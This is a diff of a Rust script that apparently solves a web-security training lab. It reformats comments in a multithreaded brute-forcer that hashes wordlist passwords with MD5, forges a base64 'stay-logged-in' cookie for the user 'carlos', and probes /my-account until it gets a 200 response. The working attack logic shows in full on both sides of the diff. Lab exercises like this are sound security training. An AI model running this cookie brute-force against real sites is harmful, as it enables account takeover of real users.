@@ -38,33 +38,56 @@ use text_colorizer::Colorize;
 * Main Function
 **********************/
 fn main() -> Result<(), Box<dyn error::Error>> {
-    let url = "https://0a09002e04be458e83d2e76d0030000b.web-security-academy.net"; // change this to url of your lab
-    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords")?; // change the path to your list
-    let threads = 8;
-    let passwords: Vec<&str> = passwords_as_string.split("\n").collect(); // change split to \r\n if you are still a windows user
-    let chunk_per_thread = passwords.len() / threads; // how many passwords will be tried in each thread
-    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect(); // split the whole list to sublist to run each one in a thread
+    // change this to your lab URL
+    let url = "https://0a09002e04be458e83d2e76d0030000b.web-security-academy.net";
 
+    // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    let start_time = time::Instant::now(); // capture time before brute forcing
+    // read passwords as one big string
+    // change the path to your list
+    let passwords_as_string = fs::read_to_string("/home/ahmed/passwords")?;
+
+    // split the big string to a list of passwords
+    // change the separator to \r\n if you are still a windows user
+    let passwords: Vec<&str> = passwords_as_string.split("\n").collect();
+
+    // set number of threads
+    let threads = 8;
+
+    // how many passwords will be tried in each thread
+    let chunk_per_thread = passwords.len() / threads;
+
+    // split the whole list to sublist to run each one in a thread
+    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();
+
+    // capture time before brute forcing
+    let start_time = time::Instant::now();
+
     println!(
         "{} {}..",
         "[#] Brute frocing password of".white().bold(),
         "carlos".green().bold()
     );
+
+    // run every sublist in a thread
     passwords_chunks.par_iter().for_each(|minilist| {
-        // run every sublist in a thread
+        // iterate over every sublist
         for password in minilist.iter() {
-            // iterate over every sublist
-            let password_hash = format!("{:x}", md5::compute(password)); // compute the md5 hash of password
+            // compute the md5 hash of password
+            let password_hash = format!("{:x}", md5::compute(password));
+
+            // encrypt the hash with the username (base64)
             let cookie_encrypted = base64::engine::general_purpose::STANDARD_NO_PAD
-                .encode(format!("carlos:{password_hash}")); // encrypt the hash with the username (base64)
+                .encode(format!("carlos:{password_hash}"));
+
+            // try to GET /my-account with the modified cookie
             let get_res = client
                 .get(format!("{url}/my-account"))
                 .header("Cookie", format!("stay-logged-in={cookie_encrypted}"))
                 .send()
-                .unwrap(); // try to GET /my-account with the modified cookie
+                .unwrap();
+
             match get_res.status().as_u16() {
                 // check the response status code
                 200 => {
@@ -75,6 +98,8 @@ fn main() -> Result<(), Box<dyn error::Error>> {
                         password.green().bold()
                     );
                     print_finish_message(start_time);
+
+                    // exit from the program
                     process::exit(0);
                 }
                 _ => {
